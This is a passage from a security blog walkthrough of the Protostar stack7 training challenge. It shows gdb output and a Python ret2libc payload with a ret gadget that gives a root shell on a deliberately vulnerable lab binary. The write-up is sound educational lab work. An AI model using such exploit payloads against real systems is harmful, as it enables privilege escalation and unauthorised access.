  <span class="n">getpath</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="overview-7">Overview</h3><p><code class="language-plaintext highlighter-rouge">Stack6 introduces return to .text to gain code execution.</code></p><p>When the <code class="language-plaintext highlighter-rouge">call</code> assembly instruction is called in the main for <code class="language-plaintext highlighter-rouge">getpath()</code> the return address is put on top of the stack and if any arguments were passed then it would also be put on the stack. If we write enough data to the buffer, we can overwrite the return address with our own address so we can hijack the execution flow when <code class="language-plaintext highlighter-rouge">ret</code> is executed. There is an issue though… the modified return address cannot start with <code class="language-plaintext highlighter-rouge">0xb</code> otherwise it will exit.</p><h3 id="exploit-7">Exploit</h3><p>When we open the <code class="language-plaintext highlighter-rouge">stack7</code> binary in gdb we can first start by setting a break right at the <code class="language-plaintext highlighter-rouge">ret</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>user@protostar:/opt/protostar/bin<span class="nv">$ </span>gdb <span class="nt">-q</span> ./stack7
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
<span class="o">(</span>gdb<span class="o">)</span> disas getpath
Dump of assembler code <span class="k">for function </span>getpath:
...
0x0804853e &lt;getpath+122&gt;: call   0x80483f4 &lt;strdup@plt&gt;
0x08048543 &lt;getpath+127&gt;: leave
0x08048544 &lt;getpath+128&gt;: ret
End of assembler dump.
<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>0x08048543
Breakpoint 1 at 0x8048543: file stack7/stack7.c, line 24.
</pre></table></code></div></div><p>Similar to the previous levels we were able to find the offset with <code class="language-plaintext highlighter-rouge">pattern_create.rb</code> and found out that the offset is 80 bytes. For this challenge Im gonna use the ret2libc technique. Essentially we want to put the address of the the libc function <code class="language-plaintext highlighter-rouge">system()</code> as the return address and pass <code class="language-plaintext highlighter-rouge">/bin/sh</code> as an argument. Since strings in C are passed as pointers then the stack should contain the address of the string.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-10-exploit-education-protostar-stack-series/stack7.png" style="width: 50%" /></p><p>Now we can use GDB to find the address of <code class="language-plaintext highlighter-rouge">system()</code> to get the address.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p system
<span class="nv">$3</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ecffb0 &lt;__libc_system&gt;
</pre></table></code></div></div><p>Now we need to find where libc is loaded so we can call <code class="language-plaintext highlighter-rouge">/bin/sh</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> info proc map 
process 11431
cmdline <span class="o">=</span> <span class="s1">'/opt/protostar/bin/stack7'</span>
cwd <span class="o">=</span> <span class="s1">'/opt/protostar/bin'</span>
exe <span class="o">=</span> <span class="s1">'/opt/protostar/bin/stack7'</span>
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack7
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack7
         0x804a000  0x806b000    0x21000          0           <span class="o">[</span>heap]
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fde000 0xb7fe2000     0x4000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           <span class="o">[</span>vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           <span class="o">[</span>stack]
</pre></table></code></div></div><p>Now that we know where libc starts at address <code class="language-plaintext highlighter-rouge">0xb7e97000</code>. Since <code class="language-plaintext highlighter-rouge">/bin/sh</code> is a string on in libc we can find the offset from the start of the file. In order to do this we can use the <code class="language-plaintext highlighter-rouge">-t x</code> to display the the offset in hex.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>user@protostar:/opt/protostar/bin<span class="nv">$ </span>strings <span class="nt">-a</span> <span class="nt">-t</span> x /lib/libc-2.11.2.so | <span class="nb">grep</span> /bin/sh
 11f3bf /bin/sh
</pre></table></code></div></div><p>We can see that the offset is at <code class="language-plaintext highlighter-rouge">0x11f3bf</code> we can find the exact offset in memory since we know the base address is <code class="language-plaintext highlighter-rouge">0xb7e97000</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">hex</span><span class="p">(</span><span class="mh">0xb7e97000</span> <span class="o">+</span> <span class="mh">0x11f3bf</span><span class="p">)</span>
<span class="s">'0xb7fb63bf'</span>
</pre></table></code></div></div><p>If we go back into GDB we can verify this:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> x/s 0xb7fb63bf
0xb7fb63bf:  <span class="s2">"/bin/sh"</span>
</pre></table></code></div></div><p>Now we can begin to write our exploit with all this info.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">offset</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">80</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">);</span>
<span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xb7fb63bf</span><span class="p">);</span>
</pre></table></code></div></div><p>But wait… Remember there is a restriction on the return address that we haven’t satisfied yet. The return address of <code class="language-plaintext highlighter-rouge">system</code> starts with <code class="language-plaintext highlighter-rouge">0xb</code>. So to get around this we will have to utilize ROP (Return Oriented Programming). Which essentially we want to find <em>gadgets</em>, which is small set of instructions already present in the code to accomplish a specific goal.</p><p>When the <code class="language-plaintext highlighter-rouge">ret</code> variable is set the processor will push to the address to the top of the stack into thus changing the EIP, and will also increment ESP by 4 bytes (stack grows towards lower addresses). If the address at the top of the stack points to another ret instruction, when it is poped off and executed the step I previously explained will happen again and the execution will continue at the next address that is on the stack. So we need can avoid the the return address checking by modifying our exploit to put the address of a ret instruction as the return address, before the address of the system. We can use a random ret instruction address in our program. For this exploit I just used the first address.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>user@protostar:/opt/protostar/bin# objdump <span class="nt">-D</span> stack7 | <span class="nb">grep </span>ret
 8048383:       c3                      ret    
 8048494:       c3                      ret    
 80484c2:       c3                      ret    
 8048544:       c3                      ret    
 8048553:       c3                      ret    
 8048564:       c3                      ret    
 80485c9:       c3                      ret    
 80485cd:       c3                      ret    
 80485f9:       c3                      ret    
 8048617:       c3                      ret    
</pre></table></code></div></div><p>So now our stack should look something like this:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-10-exploit-education-protostar-stack-series/stack7_1.png" style="width: 50%" /></p><p>The final exploit will look something like below:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">struct</span>
<span class="n">offset</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">80</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0x8048383</span><span class="p">);</span> <span class="c1"># address of ret
</span><span class="n">system</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xb7ecffb0</span><span class="p">);</span> <span class="c1"># system()
</span><span class="n">shell</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"I"</span><span class="p">,</span> <span class="mh">0xb7fb63bf</span><span class="p">);</span> <span class="c1"># "/bin/sh"
</span><span class="k">print</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="s">'AAAA'</span> <span class="o">+</span> <span class="n">shell</span> 
</pre></table></code></div></div><p>But wait why are we using <code class="language-plaintext highlighter-rouge">AAAA</code> well remember “return address 3” in the photo above? It techincally doesn’t matter what this is as long as its 4 bytes. The <code class="language-plaintext highlighter-rouge">AAAA</code> can be replaced with <code class="language-plaintext highlighter-rouge">exit</code> address since this value is used for the return address for <code class="language-plaintext highlighter-rouge">system()</code>.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="o">(</span><span class="nb">cat</span> /tmp/txt<span class="p">;</span> <span class="nb">cat</span><span class="o">)</span> | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�����AAAA�c��
<span class="nb">whoami
</span>root
</pre></table></code></div></div><h2 id="so-what-now">So what now?</h2><p>I just wanna make it clear that doing Protostar is not the same as exploiting modern systems. The challenges are compiled on older 32 bit systems and lack mitigation techniques that are common practice today, such as:</p><ul><li>Non-executable stack (NX) not enabled<li>No stack canaries<li>The system has ASLR (Address Space Layout Randomization) disabled</ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploitdev/'>ExploitDev</a>, <a href='/categories/exploit-exercise/'>Exploit Exercise</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/protostar/" class="post-tag no-text-decoration" >protostar</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/buffer/" class="post-tag no-text-decoration" >buffer</a> <a href="/tags/overflow/" class="post-tag no-text-decoration" >overflow</a> <a href="/tags/walkthrough/" class="post-tag no-text-decoration" >walkthrough</a> <a href="/tags/ret2lic/" class="post-tag no-text-decoration" >ret2lic</a> <a href="/tags/bof/" class="post-tag no-text-decoration" >bof</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploit Exercise Protostar Stack Series - Ap3x Security&url=https://ap3x.github.io/posts/exploit-education-protostar-stack-series/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploit Exercise Protostar Stack Series - Ap3x Security&u=https://ap3x.github.io/posts/exploit-education-protostar-stack-series/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Exploit Exercise Protostar Stack Series - Ap3x Security&url=https://ap3x.github.io/posts/exploit-education-protostar-stack-series/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/exploit-education-protostar-stack-series/">Exploit Exercise Protostar Stack Series</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/osce/">osce</a> <a class="post-tag" href="/tags/development/">development</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/how-to/">how to</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/overflow/">overflow</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/proxmox/">proxmox</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/egghunter-x86_64/"><div class="card-body"> <span class="timeago small" > Jul 6, 2020 <i class="unloaded">2020-07-06T12:46:49-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>EggHunter x86_64</h3><div class="text-muted small"><p> What is an Egg Hunter? Essentially an egg hunter is used assuming that you found a overflow vulnerability with a very small space that you, the attacker controls that is less that that of a bind/r...</p></div></div></a></div><div class="card"> <a href="/posts/offensive-security-certified-expert-study-plan/"><div class="card-body"> <span class="timeago small" > May 11, 2020 <i class="unloaded">2020-05-11T12:52:52-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Offensive Security Certified Expert Study Plan</h3><div class="text-muted small"><p> While taking summer computer science and engineering classes I took part in an independent study which allows me to make my own course essentially and do research on the topics I choose. So I decid...</p></div></div></a></div><div class="card"> <a href="/posts/advance-web-attacks/"><div class="card-body"> <span class="timeago small" > May 16, 2020 <i class="unloaded">2020-05-16T16:47:17-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Advance Web Attacks</h3><div class="text-muted small"><p> Introduction This content is gathered from multiple different resources that I have added all to this post that helped me understand and learn more about exploit development. There are a lot of go...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/pivoting-with-chisel/" class="btn btn-outline-primary" prompt="Older"><p>Pivoting with Chisel</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div><div id="disqus" class="pt-2 pb-2"><p class="text-center text-muted small pb-5"> Loading comments from <a href="https://disqus.com/">Disqus</a> ...</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> const options = { scriptUrl: '//blog-9jgepddjsv.disqus.com/embed.js', disqusConfig: function() { this.page.title = 'Exploit Exercise Protostar Stack Series'; this.page.url = 'https://ap3x.github.io/posts/exploit-education-protostar-stack-series/'; this.page.identifier = '/posts/exploit-education-protostar-stack-series/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://github.com/Ap3x">Noah Tongate</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/osce/">osce</a> <a class="post-tag" href="/tags/development/">development</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/how-to/">how to</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/overflow/">overflow</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/proxmox/">proxmox</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ap3x.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
